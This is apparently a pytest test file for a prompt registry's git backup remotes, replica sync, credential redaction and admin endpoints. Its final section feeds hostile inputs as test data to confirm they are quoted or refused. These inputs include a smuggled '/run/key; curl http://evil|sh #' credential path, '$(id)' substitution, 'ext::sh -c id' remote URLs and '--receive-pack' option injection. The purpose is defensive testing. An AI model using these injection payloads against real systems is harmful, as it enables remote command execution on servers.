"""Backup pushes to remotes (§6) and the serve-replica content follow (§13/§15)."""

from __future__ import annotations

import subprocess
import logging

import pytest
from sqlalchemy import select

from incant import db, models
from incant.config import Settings, set_settings
from incant.db import session_scope
from incant.gitstore import GitError, GitStore, redact_url
from incant.service import AppContext, reset_app

from .conftest import db_url_for, reset_schema
from .test_server import auth, make_client, make_key


@pytest.fixture()
def app(tmp_path):
    set_settings(Settings(
        database_url=db_url_for(tmp_path),
        repo_path=str(tmp_path / "repo"),
    ))
    db.reset_engine()
    reset_app()
    reset_schema()
    ctx = AppContext()
    ctx.initialize()
    with session_scope() as s:
        s.add(models.Environment(id="prod", name="prod", protected=False, track_tip=False))
    yield ctx


def _bare(path) -> str:
    subprocess.run(["git", "init", "--bare", "--initial-branch=main", str(path)],
                   capture_output=True, check=True)
    return str(path)


def _head(repo_path) -> str:
    return subprocess.run(
        ["git", "--git-dir", str(repo_path), "rev-parse", "refs/heads/main"],
        capture_output=True, text=True, check=True,
    ).stdout.strip()


def _commit(ctx, prompt_id="support/system", version=1, content="hello {{ x }}"):
    with session_scope() as s:
        reg = ctx.registry(s, "sam")
        if not reg.prompt_exists(prompt_id):
            reg.create_prompt(prompt_id)
        d = reg.create_draft(prompt_id, version_number=version, author="sam", content=content)
        return reg.commit_draft(d.id, author="sam", message=f"v{version}").sha


def _add_remote(url, enabled=True, auth_ref=None) -> int:
    with session_scope() as s:
        r = models.Remote(url=url, enabled=enabled, auth_ref=auth_ref)
        s.add(r)
        s.flush()
        return r.id


# ── pusher (full node) ───────────────────────────────────────────────

def test_push_pending_drains_to_remote(app, tmp_path):
    sha = _commit(app)
    remote = _bare(tmp_path / "backup.git")
    _add_remote(remote)

    with session_scope() as s:
        statuses = app.backup.push_pending(s)
    assert statuses[0].error is None
    assert statuses[0].last_pushed_sha == app.git.head()
    assert statuses[0].pending_commits == 0 and statuses[0].lag_seconds == 0.0
    # The remote is a full mirror: main matches, and the commit is reachable.
    assert _head(remote) == app.git.head()
    assert sha  # the authored commit is on main, hence at the remote


def test_mirror_push_carries_draft_refs(app, tmp_path):
    _commit(app)
    with session_scope() as s:
        reg = app.registry(s, "sam")
        d = reg.create_draft("support/system", version_number=1, author="sam",
                             content="wip {{ x }}")
        draft_id = d.id
    remote = _bare(tmp_path / "backup.git")
    _add_remote(remote)
    with session_scope() as s:
        app.backup.push_pending(s)
    out = subprocess.run(["git", "--git-dir", remote, "for-each-ref",
                          "--format=%(refname)", "refs/incant/drafts/"],
                         capture_output=True, text=True, check=True).stdout
    assert f"refs/incant/drafts/{draft_id}" in out


def test_disabled_remote_is_skipped(app, tmp_path):
    _commit(app)
    remote = _bare(tmp_path / "backup.git")
    _add_remote(remote, enabled=False)
    with session_scope() as s:
        statuses = app.backup.push_pending(s)
    assert statuses[0].last_pushed_sha is None       # never pushed
    assert statuses[0].pending_commits >= 1          # queue visible, not drained


def test_failed_push_keeps_queue_and_reports(app, tmp_path):
    _commit(app)
    _add_remote(str(tmp_path / "does-not-exist.git"))
    with session_scope() as s:
        statuses = app.backup.push_pending(s)
    st = statuses[0]
    assert st.error is not None
    assert st.last_pushed_sha is None
    assert st.pending_commits >= 1
    assert st.lag_seconds >= 0.0                     # exposure window is open


def test_second_pass_is_incremental(app, tmp_path):
    _commit(app, version=1)
    remote = _bare(tmp_path / "backup.git")
    _add_remote(remote)
    with session_scope() as s:
        app.backup.push_pending(s)
    first = _head(remote)
    _commit(app, version=2, content="v2 {{ x }}")
    with session_scope() as s:
        statuses = app.backup.push_pending(s)
    assert _head(remote) == app.git.head() != first
    assert statuses[0].pending_commits == 0


# ── replica follow (serve mode) ──────────────────────────────────────

def test_replica_hydrates_and_follows(app, tmp_path):
    _commit(app, version=1)
    remote = _bare(tmp_path / "backup.git")
    _add_remote(remote)
    with session_scope() as s:
        app.backup.push_pending(s)

    # A replica against an empty volume hydrates by mirror-cloning the remote…
    replica_git = GitStore(tmp_path / "replica-repo")
    replica = AppContext()
    replica.git = replica_git
    replica.backup.git = replica_git
    with session_scope() as s:
        assert replica.backup.hydrate(s) is True
    assert replica_git.head() == app.git.head()

    # …and a later commit reaches it on the next fetch pass.
    _commit(app, version=2, content="v2 {{ x }}")
    with session_scope() as s:
        app.backup.push_pending(s)
    with session_scope() as s:
        assert replica.backup.fetch_once(s) is True
    assert replica_git.head() == app.git.head()


def test_hydrate_fails_cleanly_with_no_reachable_remote(app, tmp_path):
    _add_remote(str(tmp_path / "gone.git"))
    replica_git = GitStore(tmp_path / "replica-repo")
    replica = AppContext()
    replica.git = replica_git
    replica.backup.git = replica_git
    with session_scope() as s:
        assert replica.backup.hydrate(s) is False
    assert not replica_git.exists()


# ── URL redaction ────────────────────────────────────────────────────

def test_redact_url_masks_embedded_credentials():
    assert redact_url("https://alice:tok3n@git.example.com/x.git") == \
        "https://alice:***@git.example.com/x.git"
    assert redact_url("git@github.com:org/repo.git") == "git@github.com:org/repo.git"
    assert redact_url("/var/backups/repo.git") == "/var/backups/repo.git"


# ── mgmt endpoints ───────────────────────────────────────────────────

def test_remotes_crud_push_and_rbac(tmp_path):
    with make_client(tmp_path) as client:
        remote = _bare(tmp_path / "backup.git")

        # Admin registers a remote; the kick endpoint pushes it synchronously.
        r = client.post("/mgmt/remotes", json={"url": remote}, headers=auth())
        assert r.status_code == 200, r.text
        assert "warning" not in r.json()  # plain path: nothing to warn about
        rid = r.json()["id"]
        r = client.post(f"/mgmt/remotes/{rid}/push", headers=auth())
        assert r.status_code == 200 and r.json()["error"] is None, r.text
        assert r.json()["last_pushed_sha"] == _head(tmp_path / "repo")

        # The list reports a drained queue.
        listing = client.get("/mgmt/remotes", headers=auth()).json()["remotes"]
        assert listing[0]["pending_commits"] == 0

        # Duplicate URL refused; disable via PATCH; delete.
        assert client.post("/mgmt/remotes", json={"url": remote},
                           headers=auth()).status_code == 409
        r = client.patch(f"/mgmt/remotes/{rid}", json={"enabled": False}, headers=auth())
        assert r.status_code == 200 and r.json()["enabled"] is False
        assert client.delete(f"/mgmt/remotes/{rid}", headers=auth()).status_code == 200
        assert client.get("/mgmt/remotes", headers=auth()).json()["remotes"] == []

        # Remotes are admin-only: an operator can't even list them.
        op = make_key(client, "operator", env="prod")
        assert client.get("/mgmt/remotes", headers=auth(op)).status_code == 403


def test_remote_list_redacts_credentials(tmp_path):
    with make_client(tmp_path) as client:
        r = client.post("/mgmt/remotes",
                        json={"url": "https://bob:s3cret@git.example.com/backup.git"},
                        headers=auth())
        assert r.status_code == 200 and "s3cret" not in r.text
        # Embedded credentials are allowed but discouraged: the response says so.
        assert "auth_ref" in r.json().get("warning", "")
        listing = client.get("/mgmt/remotes", headers=auth())
        assert "s3cret" not in listing.text
        assert "***" in listing.json()["remotes"][0]["url"]


def test_failed_remote_never_leaks_credentials_to_logs_response_or_audit(
    tmp_path, monkeypatch, caplog,
):
    secret = "super-secret-token"
    raw_url = f"https://backup:{secret}@git.example.com/missing.git"

    def fail_with_echo(self, url, **kwargs):
        # Simulate git echoing the exact credential-bearing URL in stderr.
        raise GitError(f"fatal: unable to access {url}: authentication failed for {secret}")

    monkeypatch.setattr(GitStore, "push_mirror", fail_with_echo)
    caplog.set_level(logging.WARNING, logger="incant.backup")

    with make_client(tmp_path) as client:
        remote_id = client.post(
            "/mgmt/remotes", json={"url": raw_url}, headers=auth()
        ).json()["id"]
        response = client.post(f"/mgmt/remotes/{remote_id}/push", headers=auth())
        assert response.status_code == 200
        assert response.json()["error"]
        assert secret not in response.text
        assert secret not in caplog.text

        with session_scope() as s:
            audit = s.execute(select(models.AuditLog).where(
                models.AuditLog.action == "remote.push"
            ).order_by(models.AuditLog.id.desc())).scalars().first()
            assert audit is not None
            assert secret not in str(audit.after)


def test_changing_remote_url_resets_push_history(tmp_path):
    with make_client(tmp_path) as client:
        remote = _bare(tmp_path / "backup.git")
        rid = client.post("/mgmt/remotes", json={"url": remote}, headers=auth()).json()["id"]
        client.post(f"/mgmt/remotes/{rid}/push", headers=auth())
        other = _bare(tmp_path / "other.git")
        r = client.patch(f"/mgmt/remotes/{rid}", json={"url": other}, headers=auth())
        assert r.status_code == 200
        listing = client.get("/mgmt/remotes", headers=auth()).json()["remotes"]
        # A different repository has its own empty push history — the queue reopens.
        assert listing[0]["last_pushed_sha"] is None
        assert listing[0]["pending_commits"] >= 1


def test_remote_auth_by_scheme(tmp_path):
    # auth_ref is a PATH, interpreted by URL scheme: ssh → deploy key via
    # GIT_SSH_COMMAND; https → git credential-store file via credential.helper —
    # the secret itself never enters the DB or a process argument.
    from incant.gitstore.store import _remote_auth

    argv, env = _remote_auth("git@github.com:org/x.git", "/secrets/key", "/etc/kh")
    assert argv == []
    assert env["GIT_SSH_COMMAND"] == \
        "ssh -i /secrets/key -o IdentitiesOnly=yes -o UserKnownHostsFile=/etc/kh"

    argv, env = _remote_auth("https://github.com/org/x.git", "/secrets/creds", None)
    assert env == {}
    assert argv == ["-c", "credential.helper=store --file=/secrets/creds"]

    argv, env = _remote_auth("https://github.com/org/x.git", None, None)
    assert (argv, env) == ([], {})
    argv, env = _remote_auth(str(tmp_path / "bare.git"), None, None)
    assert (argv, env) == ([], {})


# ── remote credential paths + URLs reach a shell: quoting and grammar ──
#
# Git runs GIT_SSH_COMMAND through `sh -c`, and a credential helper too. An admin-supplied
# `auth_ref` of `/run/key; curl evil|sh #` therefore used to execute on every node — from
# the 15 s backup loop, the replica fetch loop, and synchronously via
# POST /mgmt/remotes/{id}/push. Two layers now: `_remote_auth` shell-quotes every path
# (tested here against REAL git), and the schemas/boot refuse anything outside a tight
# grammar (tested below).

import os  # noqa: E402
import shlex  # noqa: E402

from incant.gitstore.store import (  # noqa: E402
    RemoteGitError, _remote_auth, validate_auth_ref, validate_remote_url,
)


def test_remote_auth_quotes_paths_for_the_shell(tmp_path):
    # Pure: a hostile path becomes ONE quoted word; a plain path is left as-is (the
    # assertions in test_remote_auth_by_scheme above stay byte-identical).
    payload = "/run/key; curl http://evil|sh #"
    argv, env = _remote_auth("git@github.com:org/x.git", payload, "/etc/known hosts")
    assert env["GIT_SSH_COMMAND"] == (
        f"ssh -i {shlex.quote(payload)} -o IdentitiesOnly=yes "
        f"-o UserKnownHostsFile={shlex.quote('/etc/known hosts')}")
    # shlex round-trips it: the shell will hand ssh exactly these words.
    assert shlex.split(env["GIT_SSH_COMMAND"]) == [
        "ssh", "-i", payload, "-o", "IdentitiesOnly=yes",
        "-o", "UserKnownHostsFile=/etc/known hosts"]
    argv, _ = _remote_auth("https://github.com/org/x.git", payload, None)
    assert argv == ["-c", f"credential.helper=store --file={shlex.quote(payload)}"]


def _fake_ssh(tmp_path, monkeypatch) -> str:
    """Put a fake `ssh` first on PATH that records its argv (one per line) and exits
    255, so a real `git push` over ssh:// exercises git's actual `sh -c` invocation of
    GIT_SSH_COMMAND without a network. Returns the argv log path."""
    bin_dir = tmp_path / "bin"
    bin_dir.mkdir()
    log = tmp_path / "ssh-argv.log"
    (bin_dir / "ssh").write_text(
        "#!/bin/sh\nprintf '%s\\n' \"$@\" > \"$FAKE_SSH_LOG\"\nexit 255\n")
    (bin_dir / "ssh").chmod(0o755)
    monkeypatch.setenv("PATH", f"{bin_dir}:{os.environ['PATH']}")
    monkeypatch.setenv("FAKE_SSH_LOG", str(log))
    return str(log)


def test_ssh_command_survives_the_shell_intact(app, tmp_path, monkeypatch):
    log = _fake_ssh(tmp_path, monkeypatch)
    key = tmp_path / "with space" / "deploy key"
    kh = tmp_path / "with space" / "known hosts"
    key.parent.mkdir()
    marker = tmp_path / "pwned"
    # The URL's port is irrelevant — the fake ssh never connects — but git must reach
    # the point of running GIT_SSH_COMMAND, which needs an ssh:// URL.
    url = "ssh://127.0.0.1:1/nowhere.git"

    # A path WITH A SPACE reaches ssh as one argument each.
    with pytest.raises(RemoteGitError):
        app.git.push_mirror(url, auth_ref=str(key), known_hosts_path=str(kh), timeout=20)
    argv = open(log).read().splitlines()
    assert argv[:6] == ["-i", str(key), "-o", "IdentitiesOnly=yes",
                        "-o", f"UserKnownHostsFile={kh}"]

    # A shell payload is an (inert) filename, not a second command.
    payload = f"{tmp_path}/key; touch {marker} #"
    with pytest.raises(RemoteGitError):
        app.git.push_mirror(url, auth_ref=payload, timeout=20)
    argv = open(log).read().splitlines()
    assert argv[:2] == ["-i", payload]
    assert not marker.exists()


def test_credential_helper_path_is_shell_safe(tmp_path):
    # The https side: git runs `store --file=<path>` via the shell as well. Feed the exact
    # argv `_remote_auth` produces to `git credential fill`, which invokes the helper the
    # way a push would.
    def fill(auth_ref):
        argv, _ = _remote_auth("https://example.com/x.git", auth_ref, None)
        return subprocess.run(
            ["git", *argv, "credential", "fill"], input="protocol=https\nhost=example.com\n",
            capture_output=True, text=True, env={**os.environ, "GIT_TERMINAL_PROMPT": "0"},
        )

    creds = tmp_path / "with space" / "creds"
    creds.parent.mkdir()
    creds.write_text("https://alice:s3cret@example.com\n")
    out = fill(str(creds))
    assert out.returncode == 0 and "password=s3cret" in out.stdout, out.stderr

    marker = tmp_path / "pwned"
    out = fill(f"{tmp_path}/nope; touch {marker} #")
    assert out.returncode != 0          # no credential found — and nothing else happened
    assert not marker.exists()


def test_dash_prefixed_url_is_never_an_option(app, tmp_path):
    # `--` before the positional URL: a value starting with `-` is a bad URL, not an
    # option git would honour (e.g. --receive-pack=<command>).
    marker = tmp_path / "pwned"
    with pytest.raises(RemoteGitError):
        app.git.push_mirror(f"--receive-pack=touch {marker}")
    with pytest.raises(RemoteGitError):
        app.git.mirror_fetch(f"--upload-pack=touch {marker}")
    assert not marker.exists()


def test_remote_grammars():
    for ok in ["https://git.example.com/x.git", "http://h/x.git", "ssh://h:2222/x.git",
               "git@github.com:acme/backup.git", "backup-host:incant.git",
               "file:///var/backups/repo.git", "/var/backups/repo.git"]:
        assert validate_remote_url(f"  {ok}  ") == ok
    for bad, why in [("", "empty"), ("   ", "empty"), ("ext::sh -c id", "remote-helper"),
                     ("fd::3", "remote-helper"), ("git://h/x.git", "allowed forms"),
                     ("relative/path.git", "allowed forms"), ("-flag", "allowed forms"),
                     ("https://h/x.git y", "whitespace"), ("/a\nb", "whitespace")]:
        with pytest.raises(ValueError, match=why):
            validate_remote_url(bad)
    for ok in ["/run/secrets/key", "/etc/incant/creds.v2", "/a/b_c-d@e"]:
        assert validate_auth_ref(ok) == ok
    for bad in ["", "run/secrets/key", "/run/key; curl evil|sh #", "/run/my key", "-i",
                "/run/$(id)", "/run/key\n", "/" + "a" * 1100]:
        with pytest.raises(ValueError):
            validate_auth_ref(bad)


def test_remote_endpoints_refuse_unsafe_url_and_auth_ref(tmp_path):
    with make_client(tmp_path) as client:
        remote = _bare(tmp_path / "backup.git")
        bad_refs = ["/run/key; curl http://evil|sh #", "/run/my key", "relative/key", "-i"]
        for ref in bad_refs:
            r = client.post("/mgmt/remotes", json={"url": remote, "auth_ref": ref}, headers=auth())
            assert r.status_code == 422, (ref, r.text)
            assert "auth_ref" in r.text
        for url in ["ext::sh -c id", "git://h/x.git", "relative.git", "-flag", "https://h/x y"]:
            r = client.post("/mgmt/remotes", json={"url": url}, headers=auth())
            assert r.status_code == 422, (url, r.text)
        assert client.get("/mgmt/remotes", headers=auth()).json()["remotes"] == []

        # The documented forms register fine (a clear message names the allowed ones).
        for url in [remote, "git@github.com:acme/backup.git", "ssh://h/x.git",
                    "https://h/x.git", f"file://{remote}"]:
            r = client.post("/mgmt/remotes", json={"url": url, "auth_ref": "/run/secrets/key"},
                            headers=auth())
            assert r.status_code == 200, (url, r.text)
        rid = client.get("/mgmt/remotes", headers=auth()).json()["remotes"][0]["id"]

        # PATCH goes through the same grammar; an empty auth_ref clears the path.
        for body in [{"url": "ext::id"}, {"url": ""}, {"auth_ref": "/k; id"}]:
            assert client.patch(f"/mgmt/remotes/{rid}", json=body, headers=auth()).status_code == 422
        assert client.patch(f"/mgmt/remotes/{rid}", json={"auth_ref": ""},
                            headers=auth()).status_code == 200
        with session_scope() as s:
            assert s.get(models.Remote, rid).auth_ref is None
